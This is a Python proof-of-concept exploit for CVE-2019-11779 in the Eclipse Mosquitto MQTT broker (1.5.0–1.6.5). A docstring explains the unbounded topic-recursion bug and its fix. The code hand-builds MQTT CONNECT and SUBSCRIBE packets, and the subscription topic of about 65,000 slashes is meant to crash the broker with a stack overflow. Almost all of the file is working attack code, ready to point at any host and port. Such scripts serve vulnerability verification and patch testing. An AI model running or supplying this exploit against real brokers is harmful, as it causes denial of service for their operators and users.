#!/usr/bin/env python3
"""
CVE-2019-11779 PoC - Eclipse Mosquitto 1.5.0-1.6.5 stack overflow via an
over-deep topic hierarchy in a SUBSCRIBE packet.

Root cause (src/subs.c, v1.6.5):
    sub__topic_tokenise()  -> one sub__token per '/' (no count limit)
    sub__add_recurse()     -> tail-recurses once per token (subs.c:314/320)
A SUBSCRIBE topic of ~65400 '/' characters => ~65400 recursion frames =>
stack guard page overrun => SIGSEGV. Fixed in 1.6.6 (commit 84681d97) by
capping the token count at TOPIC_HIERARCHY_LIMIT (200).

We hand-roll MQTT 3.1.1 frames: CONNECT then a SUBSCRIBE carrying the long
slash topic. (Topic-filter syntax: a bare run of '/' is a valid filter -
each level is an empty name - so it passes the topic_check and reaches the
recursive add.)

Usage: python3 poc_cve_2019_11779.py [host] [port] [num_slashes]
"""
import socket
import struct
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 1883
# MQTT topic-name length is a uint16, so the wire max is 65535 chars. ~65000
# '/' is well past the 200-level fix limit and deep enough to overrun the stack.
nslash = int(sys.argv[3]) if len(sys.argv) > 3 else 65000


def remaining_length(n: int) -> bytes:
    out = b""
    while True:
        byte = n % 128
        n //= 128
        if n > 0:
            byte |= 0x80
        out += bytes([byte])
        if n == 0:
            break
    return out


def mqtt311_connect(client_id: str = "poc11779") -> bytes:
    vh = b"\x00\x04MQTT" + b"\x04" + b"\x02" + struct.pack(">H", 60)  # level 4 = 3.1.1
    cid = client_id.encode()
    payload = struct.pack(">H", len(cid)) + cid
    body = vh + payload
    return bytes([0x10]) + remaining_length(len(body)) + body


def mqtt311_subscribe_long_topic(nslash: int) -> bytes:
    # Variable header: packet identifier
    vh = struct.pack(">H", 1)
    topic = ("/" * nslash).encode()
    # Payload: topic filter (len-prefixed) + requested QoS byte
    payload = struct.pack(">H", len(topic)) + topic + b"\x00"
    body = vh + payload
    # Fixed header: SUBSCRIBE (0x82 - bit 1 reserved must be set)
    return bytes([0x82]) + remaining_length(len(body)) + body


def main() -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(8)
    s.connect((host, port))

    conn = mqtt311_connect()
    print(f"[*] -> MQTT3.1.1 CONNECT ({len(conn)} B)")
    s.sendall(conn)
    try:
        print(f"[*] <- CONNACK {s.recv(64).hex()}")
    except Exception as e:
        print(f"[!] no CONNACK: {e}")

    sub = mqtt311_subscribe_long_topic(nslash)
    print(f"[*] -> SUBSCRIBE with {nslash} '/' ({len(sub)} B total)")
    s.sendall(sub)
    print("[*] sent (expect broker stack-overflow SEGV in sub__add_recurse via subs.c)")
    try:
        s.recv(64)
    except Exception:
        pass
    s.close()


if __name__ == "__main__":
    main()
